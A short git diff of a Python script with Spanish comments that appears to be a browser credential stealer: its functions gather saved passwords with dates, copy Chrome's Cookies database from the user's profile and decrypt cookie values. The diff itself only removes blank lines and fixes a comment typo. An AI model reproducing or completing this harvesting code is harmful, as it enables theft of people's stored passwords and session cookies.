@@ -102,7 +102,6 @@ def obtener_contrasenias():
                 "password": contrasenia,
                 "fecha_creacion":obtener_fecha_calculada(date_created),
                 "ultimo_acceso":obtener_fecha_calculada(date_last_used)
-
             }
         else:
             continue
@@ -129,9 +128,7 @@ def obtener_cookies():
     directorio_cookies = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
 
-
     # copio el archivo a mi lugar de ejecucion ya que se puede bloquear la bdd si el navegador la está usando
-    
     nuevo_archivo_bdd = "Cookies.db"
     try:
         #intento copiar el archivo
@@ -168,7 +165,7 @@ def obtener_cookies():
         #objeto auxiliar para guardar un objeto con los datos
         aux = {}
 
-        #value gurda el dato si esta desencriptada
+        #value guarda el dato si esta desencriptada
         if not value:
             valor_desencriptado = desencriptar_dato(encrypted_value, llave)
         else:
